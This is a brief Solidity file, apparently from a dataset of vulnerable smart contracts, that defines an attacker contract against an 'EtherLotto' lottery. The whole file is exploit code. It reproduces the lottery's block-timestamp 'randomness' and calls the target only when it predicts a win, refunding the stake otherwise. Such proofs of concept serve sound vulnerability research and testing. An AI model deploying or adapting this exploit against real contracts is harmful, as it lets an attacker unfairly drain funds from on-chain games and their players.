pragma solidity ^0.4.15;

import "../dataset/time_manipulation/ether_lotto.sol";

contract EtherLottoAttacker {
    EtherLotto public target;

    function EtherLottoAttacker(address _target) public {
        target = EtherLotto(_target);
    }

    function play() payable returns (bool) {
        uint random = uint(sha3(block.timestamp)) % 2;
        if (random == 0) {
            target.play.value(msg.value)();
            return true;
        }
        msg.sender.transfer(msg.value);
        return false;
    }

    function() payable {}
}